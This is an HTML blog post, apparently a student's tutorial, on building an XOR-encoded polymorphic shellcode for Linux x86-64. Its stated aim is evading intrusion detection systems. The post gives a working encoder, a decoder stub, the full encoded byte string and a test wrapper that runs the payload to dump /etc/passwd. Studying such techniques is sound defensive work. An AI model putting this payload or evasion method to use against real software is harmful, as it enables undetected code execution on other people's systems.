@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Polymorphic shellcode</title>
+	
+	<meta name="description" content="How to make a polymorphic shellcode on a Linux system to bypass Network Intrusion Detection Systems.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/XAV_1860.JPG" class="img-circle" width="180" height="250" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Polymorphic shellcode </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   June 
+	   6th,
+	   
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <h1 id="1-surroundings">1. Surroundings</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>uname <span class="nt">-a</span>
+Linux debian 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux</span>
+
+<span class="nv">$ </span>lsb_release <span class="nt">-a</span>
+No LSB modules are available.
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.7 <span class="o">(</span>jessie<span class="o">)</span>
+Release:	8.7
+Codename:	jessie
+
+<span class="nv">$ </span>gcc <span class="nt">--version</span>
+gcc <span class="o">(</span>Debian 4.9.2-10<span class="o">)</span> 4.9.2
+
+<span class="nv">$ </span>nasm <span class="nt">-v</span>
+NASM version 2.11.05 compiled on Sep  9 2014
+
+<span class="nv">$ </span>ld <span class="nt">--version</span>
+GNU ld <span class="o">(</span>GNU Binutils <span class="k">for </span>Debian<span class="o">)</span> 2.25
+</code></pre></div></div>
+
+<h1 id="2-explanation">2. Explanation</h1>
+<p>For the second post of the shellcode serie, I will show you the polymorphic shellcode method.
+This method has lots of advantages. For example, the encoded shellcode can contain null bytes, she is very easy to implement and also very powerfull to bypass IDS and filters. The shellcode is composed of two parts:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+-------------------+
+|                    |                   |
+|      DECODER       | ENCODED SHELLCODE |
+|                    |                   |
++--------------------+-------------------+
+</code></pre></div></div>
+
+<p>As you can see, we will first have the decoder and the encoded shellcode. The aim is first to decode the encoded shellcode thanks to the decoder and then jump on the decoded shellcode to execute code. The operations uses to encoded/decoded the shellcode can be very different, like addition, subtraction, xor, etc. For this post, I have choose the xor algorithm with a very basic key. This shellcode is not the most optimized.</p>
+
+<h1 id="3-shellcode-writting">3. Shellcode writting</h1>
+<p>We first need a shellcode to XOR it. I’ve choose the one of <a href="/shellcode/2017/05/28/basic_shellcode.html">my previous article</a>. To XOR the shellcode, I choose the byte 0x69. This his key is very basic for two reason:</p>
+
+<ul>
+  <li>
+    <p>First because it impact the final shellcode length.</p>
+  </li>
+  <li>
+    <p>Second because the next encoded shellcode don’t contain this byte. (cf: 1^1 = 0 so null byte)</p>
+  </li>
+</ul>
+
+<p>Let’s encoded the shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>xor.c
+<span class="c">#include &lt;stdio.h&gt;</span>
+
+unsigned char shellcode[] <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">41"</span><span class="p">;</span>
+
+int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
+
+  <span class="k">for</span> <span class="o">(</span>int i <span class="o">=</span> 0<span class="p">;</span> shellcode[i]<span class="p">;</span> i++<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"0x%02x,"</span>, shellcode[i] ^ 0x69<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="nb">printf</span><span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">return </span>0<span class="p">;</span>
+<span class="o">}</span>
+
+<span class="nv">$ </span>gcc xor.c <span class="nt">-o</span> xor <span class="nt">-std</span><span class="o">=</span>c99
+
+<span class="nv">$ </span>./xor 
+0x82,0x50,0x36,0xe9,0x1e,0x62,0x28,0x21,0x58,0xa9,0x6d,0x6b,0x21,0x58,0x9f,0x66,0x6c,0x21,0xe0,0xae,0x21,0xe4,0x5d,0x4d,0x21,0x58,0xbb,0x0f,0xd3,0x96,0x66,0x21,0x58,0xa9,0x66,0x6c,0x21,0x58,0x96,0x29,0xde,0x68,0x21,0xe0,0xab,0x21,0x58,0xa9,0xd9,0x68,0x66,0x6c,0x21,0x58,0xa9,0xd9,0x55,0x66,0x6c,0x81,0xab,0x96,0x96,0x96,0x46,0x0c,0x1d,0x0a,0x46,0x19,0x08,0x1a,0x1a,0x1e,0x0d,0x28,
+</code></pre></div></div>
+
+<p>It’s ok for the encoded shellcode part. Now we will do the decoder. It will be a basic loop which will iterate all over the encoded shellcode, XOR every bytes and then jump on the decoded shellcode.</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_start</span><span class="o">:</span>
+	<span class="k">jmp</span> <span class="n">L1</span>
+<span class="n">L2</span><span class="o">:</span>
+	<span class="k">pop</span> <span class="n">rsi</span>                      <span class="c">; First pop "shell" value to RSI</span>
+	<span class="k">xor</span> <span class="n">rcx</span><span class="p">,</span> <span class="n">rcx</span>
+	<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x4c</span>                 <span class="c">; Move "shell" length (76) to cl</span>
+<span class="n">L3</span><span class="o">:</span>
+	<span class="k">xor</span> <span class="n">byte</span> <span class="err">[</span><span class="n">rsi</span><span class="o">+</span><span class="n">rcx</span><span class="err">]</span><span class="p">,</span> <span class="mh">0x69</span>     <span class="c">; XOR the "shell" byte with the key</span>
+	<span class="k">sub</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">1</span>                    <span class="c">; Substracte the "shell" length of 1</span>
+	<span class="k">jnz</span> <span class="n">L3</span>                       <span class="c">; Loop if cl is none zero</span>
+	<span class="k">xor</span> <span class="n">byte</span> <span class="err">[</span><span class="n">rsi</span><span class="o">+</span><span class="n">rcx</span><span class="err">]</span><span class="p">,</span> <span class="mh">0x69</span>     <span class="c">; XOR the last byte</span>
+	<span class="k">jmp</span> <span class="n">L4</span>                       <span class="c">; Jump on the decoded shellcode</span>
+<span class="n">L1</span><span class="o">:</span>
+	<span class="k">call</span> <span class="n">L2</span>
+<span class="n">L4</span><span class="o">:</span>
+<span class="n">shell</span><span class="o">:</span>	<span class="kt">db</span> <span class="mh">0x82</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0x6b</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0xae</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x29</span><span class="p">,</span><span class="mh">0xde</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0xd9</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x0c</span><span class="p">,</span><span class="mh">0x1d</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x28</span>
+</code></pre></div></div>
+
+<p>And now the shellcode is ready to pown binary’s!</p>
+
+<h1 id="4-the-shellcode">4. The shellcode</h1>
+<p>The final shellcode is on the last schema, now we can assemble it, compile it and check null-bytes:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nasm <span class="nt">-f</span> elf64 polymorphic.s <span class="nt">-o</span> polymorphic.o
+
+<span class="nv">$ </span>ld polymorphic.o <span class="nt">-o</span> polymorphic             
+ld: warning: cannot find entry symbol _start<span class="p">;</span> defaulting to 0000000000400080
+
+<span class="nv">$ </span>objdump <span class="nt">-d</span> polymorphic        
+
+polymorphic:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 &lt;_start&gt;:
+  400080:	eb 15                	jmp    400097 &lt;L1&gt;
+
+0000000000400082 &lt;L2&gt;:
+  400082:	5e                   	pop    %rsi
+  400083:	48 31 c9             	xor    %rcx,%rcx
+  400086:	b1 4c                	mov    <span class="nv">$0x4c</span>,%cl
+
+0000000000400088 &lt;L3&gt;:
+  400088:	80 34 0e 69          	xorb   <span class="nv">$0x69</span>,<span class="o">(</span>%rsi,%rcx,1<span class="o">)</span>
+  40008c:	80 e9 01             	sub    <span class="nv">$0x1</span>,%cl
+  40008f:	75 f7                	jne    400088 &lt;L3&gt;
+  400091:	80 34 0e 69          	xorb   <span class="nv">$0x69</span>,<span class="o">(</span>%rsi,%rcx,1<span class="o">)</span>
+  400095:	eb 05                	jmp    40009c &lt;L4&gt;
+
+0000000000400097 &lt;L1&gt;:
+  400097:	e8 e6 ff ff ff       	callq  400082 &lt;L2&gt;
+
+000000000040009c &lt;L4&gt;:
+  40009c:	82                   	<span class="o">(</span>bad<span class="o">)</span>  
+  40009d:	50                   	push   %rax
+  40009e:	36 e9 1e 62 28 21    	ss jmpq 216862c2 &lt;__bss_start+0x210852c2&gt;
+  4000a4:	58                   	pop    %rax
+  4000a5:	a9 6d 6b 21 58       	<span class="nb">test</span>   <span class="nv">$0x58216b6d</span>,%eax
+  4000aa:	9f                   	lahf   
+  4000ab:	66 6c                	data16 insb <span class="o">(</span>%dx<span class="o">)</span>,%es:<span class="o">(</span>%rdi<span class="o">)</span>
+  4000ad:	21 e0                	and    %esp,%eax
+  4000af:	ae                   	scas   %es:<span class="o">(</span>%rdi<span class="o">)</span>,%al
+  4000b0:	21 e4                	and    %esp,%esp
+  4000b2:	5d                   	pop    %rbp
+  4000b3:	4d 21 58 bb          	and    %r11,-0x45<span class="o">(</span>%r8<span class="o">)</span>
+  4000b7:	0f d3 96 66 21 58 a9 	psrlq  <span class="nt">-0x56a7de9a</span><span class="o">(</span>%rsi<span class="o">)</span>,%mm2
+  4000be:	66 6c                	data16 insb <span class="o">(</span>%dx<span class="o">)</span>,%es:<span class="o">(</span>%rdi<span class="o">)</span>
+  4000c0:	21 58 96             	and    %ebx,-0x6a<span class="o">(</span>%rax<span class="o">)</span>
+  4000c3:	29 de                	sub    %ebx,%esi
+  4000c5:	68 21 e0 ab 21       	pushq  <span class="nv">$0x21abe021</span>
+  4000ca:	58                   	pop    %rax
+  4000cb:	a9 d9 68 66 6c       	<span class="nb">test</span>   <span class="nv">$0x6c6668d9</span>,%eax
+  4000d0:	21 58 a9             	and    %ebx,-0x57<span class="o">(</span>%rax<span class="o">)</span>
+  4000d3:	d9 55 66             	fsts   0x66<span class="o">(</span>%rbp<span class="o">)</span>
+  4000d6:	6c                   	insb   <span class="o">(</span>%dx<span class="o">)</span>,%es:<span class="o">(</span>%rdi<span class="o">)</span>
+  4000d7:	81 ab 96 96 96 46 0c 	subl   <span class="nv">$0x460a1d0c</span>,0x46969696<span class="o">(</span>%rbx<span class="o">)</span>
+  4000de:	1d 0a 46 
+  4000e1:	19 08                	sbb    %ecx,<span class="o">(</span>%rax<span class="o">)</span>
+  4000e3:	1a 1a                	sbb    <span class="o">(</span>%rdx<span class="o">)</span>,%bl
+  4000e5:	1e                   	<span class="o">(</span>bad<span class="o">)</span>  
+  4000e6:	0d                   	.byte 0xd
+  4000e7:	28                   	.byte 0x28
+</code></pre></div></div>
+
+<p>Everything might be correct.</p>
+
+<h1 id="5-demonstration">5. Demonstration</h1>
+<p>And the final C wrapper to test the shellcode:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x15\x5e\x48\x31\xc9\xb1\x4c\x80\x34\x0e\x69\x80\xe9\x01\x75\xf7\x80\x34\x0e\x69\xeb\x05\xe8\xe6\xff\xff\xff\x82\x50\x36\xe9\x1e\x62\x28\x21\x58\xa9\x6d\x6b\x21\x58\x9f\x66\x6c\x21\xe0\xae\x21\xe4\x5d\x4d\x21\x58\xbb\x0f\xd3\x96\x66\x21\x58\xa9\x66\x6c\x21\x58\x96\x29\xde\x68\x21\xe0\xab\x21\x58\xa9\xd9\x68\x66\x6c\x21\x58\xa9\xd9\x55\x66\x6c\x81\xab\x96\x96\x96\x46\x0c\x1d\x0a\x46\x19\x08\x1a\x1a\x1e\x0d\x28</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">shellcode</span><span class="p">)();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can now compile it and test it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc wrapper.c <span class="nt">-z</span> execstack
+
+<span class="nv">$ </span>./a.out 
+Shellcode length: 104
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+...
+</code></pre></div></div>
+
+<p>Done.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#shellcode-ref">
+					shellcode <span>(2)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#shellcode-ref">
+					shellcode <span>(2)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Polymorphic shellcode&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/shellcode/2017/05/28/basic_shellcode.html" title="Basic Shellcode">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/write-up/2017/09/04/just_do_it.html" title="[Write-Up] Tokyo Westerns CTF 3rd 2017 - Just do it!">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
